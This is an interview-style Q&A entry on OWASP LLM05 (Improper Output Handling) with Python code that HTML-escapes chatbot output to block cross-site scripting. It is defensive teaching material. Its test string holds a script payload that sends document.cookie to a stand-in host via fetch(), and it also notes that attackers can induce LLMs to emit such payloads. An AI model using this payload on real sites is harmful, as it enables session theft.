# Q0930 · OWASP LLM05: Improper Output Handling (stored XSS, SSRF, and SQL injection)

| Section | Topic | Difficulty |
|---|---|---|
| AI Security, Guardrails & Responsible AI in a Bank | OWASP LLM Top 10 | Medium |

## Question

Explain OWASP LLM05: Improper Output Handling, and write Python code demonstrating HTML escaping of LLM responses to prevent Cross-Site Scripting (XSS).

## Answer

Improper Output Handling occurs when an application accepts LLM output without validation and passes it directly to downstream components (web browsers, SQL interpreters, or shell terminals). If an attacker induces the LLM to output `<script>alert(document.cookie)</script>`, and the frontend renders it as raw HTML, the user's browser executes malicious JavaScript.

```python
import html


def render_chat_message_to_html(raw_llm_output: str) -> str:
    # 1. HTML escape all output characters
    escaped_text = html.escape(raw_llm_output)

    # 2. Render safely inside DOM structure
    safe_html = f'<div class="chat-message">{escaped_text}</div>'
    return safe_html


# Attack payload output by LLM
attacker_output = "Here is the calculation: <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>"
rendered = render_chat_message_to_html(attacker_output)

assert "<script>" not in rendered
assert "&lt;script&gt;" in rendered
assert '<div class="chat-message">' in rendered
```

## Likely follow-ups

- How does improper output handling lead to Remote Code Execution (RCE) in code-interpreter agents?
- What headers (e.g. `Content-Security-Policy`) prevent XSS execution in the browser?

---

[← Q0929](../../batch_10_ai_security_responsible_ai/0929_owasp_llm04_data_and_model_poisoning_in_fine_tuning_and_pre/README.md) · [AI Security, Guardrails & Responsible AI in a Bank index](../README.md) · [All sections](../../README.md) · [Q0931 →](../../batch_10_ai_security_responsible_ai/0931_owasp_llm06_excessive_agency_and_autonomous_destructive/README.md)
